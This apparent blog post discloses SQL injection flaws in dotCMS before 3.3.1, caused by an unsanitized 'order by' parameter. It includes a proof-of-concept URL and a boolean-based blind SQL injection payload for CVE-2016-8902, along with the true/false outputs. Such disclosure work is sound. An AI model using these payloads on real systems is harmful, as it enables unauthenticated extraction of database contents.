## Background

### dotCMS

dotCMS related background you can read from my older post: [CVE-2016-4803 dotCMS - email header injection vulnerability (Full Disclosure)](/cve-2016-4803-dotcms-email-header-injection-vulnerability-full-disclosure.html). There I mentioned, that 2015-12-14 I sent 8 SQL injection vulnerabilities to dotCMS. Now it's time to disclose them.

### Partly Blind SQL injection from sort functionality

Why I'm doing that? To point out really widespread problem and mistake - "order by" parameter comes from a client and it goes directly to SQL query. All 8 SQL injections from dotCMS are exactly like this.

Based on my experience, it's widespread problem even in those applications, which mostly use prepared statements. As you can not bind order by and group by parameters, then those are still often concated dynamically to SQL query.

## List of Vulnerabilities

All listed SQL injection vulnerabilities are from "order by" parameter.

As attacker can control building SQL query after ORDER BY statement, attacker can not use UNION. It's also means that attacker can not get any text back to the output from other tables and other databases (if error messages are displayed out, then there can be some other options). It's Partly Blind SQL injection.

Attacker can still manipulate SQL queries and ask questios from server - answer can be just boolean, yes or no. It's enough to read out all data which is readable for current database user. It may mean also data from other databases (schemas) and tables.

### CVE-2016-8902 - categoriesServlet, sort

SQL injection vulnerability in the **categoriesServlet** in dotCMS before 3.3.1 allows **remote not authenticated** attackers to execute arbitrary SQL commands via the sort parameter.

Preconditions: **None**. No authentication needed.

Proof-of-Concept URL, vulnerable parameter is "sort":

/categoriesServlet?start=0&count=10&sort=`SQLi`

Payload

```
sort=keywords LIMIT (SELECT CASE WHEN (/*your-boolean-question-here*/) THEN 1 ELSE -1 END)--

```

For non-authenticated user in the output is always value:`{"items":[],"numRows":0}`

I use "ELSE -1" to cause error when condition was false, just for make some change to the output.

Proof-of-Concept for Partly blind SQL injection

```
sort=keywords LIMIT (SELECT CASE WHEN (1=1) THEN 1 ELSE -1 END)-- true, output: {"items":[],"numRows":0}
sort=keywords LIMIT (SELECT CASE WHEN (1=0) THEN 1 ELSE -1 END)-- false, output: blank page

```

## Update: Extra findings from fixes

When I checked how they fixed described issues, I found 2 more SQL injections: [CVE-2016-10007 and CVE-2016-10008 - 2 SQL injection vulnerabilities in dotCMS, blacklist defence bypass](/cve-2016-10007-and-cve-2016-10008-2-sql-injection-vulnerabilities-in-dotcms-blacklist-defence-bypass.html).

## Suggestions

Be always up-to-date.

Use mapping and whitelisting for order by parameters.
